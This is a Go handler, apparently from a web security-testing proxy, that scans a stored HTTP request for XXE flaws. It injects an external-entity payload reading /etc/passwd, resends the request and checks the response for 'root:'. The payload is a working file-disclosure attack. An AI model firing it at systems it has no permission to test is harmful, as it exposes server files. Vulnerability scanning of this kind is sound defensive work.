package repeatRequestHandlers

import (
	"fmt"
	"github.com/sirupsen/logrus"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

func ScanRequestForXXE(responseWriter http.ResponseWriter, request *http.Request) {
	dbRequest, err := getRequestFromDatabase(responseWriter, request)
	if err != nil {
		logrus.Error(err)
		return
	}

	if strings.Contains(dbRequest.Request, "<?xml") {
		regExp := regexp.MustCompile(`<\?xml .*\?>`)
		xmlVer := regExp.FindString(dbRequest.Request)
		dbRequest.Request = regExp.ReplaceAllLiteralString(dbRequest.Request, xmlVer+
			"\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY>\n"+
			"<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n"+
			"<foo>&xxe;</foo>\n")
	}

	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	newRequest, err := formRequest(dbRequest)
	if err != nil {
		logrus.Error(err)
	}

	response, err := client.Do(newRequest)
	if err != nil {
		logrus.Error(err)
	}

	textResp, err := ioutil.ReadAll(response.Body)
	if err != nil {
		logrus.Warn("Can't search for vulnerability")
	}

	if strings.Contains(string(textResp), "root:") {
		_, _ = fmt.Fprintf(responseWriter, "------- WARNING: Request contains XXE vulnerability\n")
	} else {
		_, _ = fmt.Fprintf(responseWriter, "------- No XXE vulnerabilities detected\n")
	}

	_ = response.Body.Close()
}
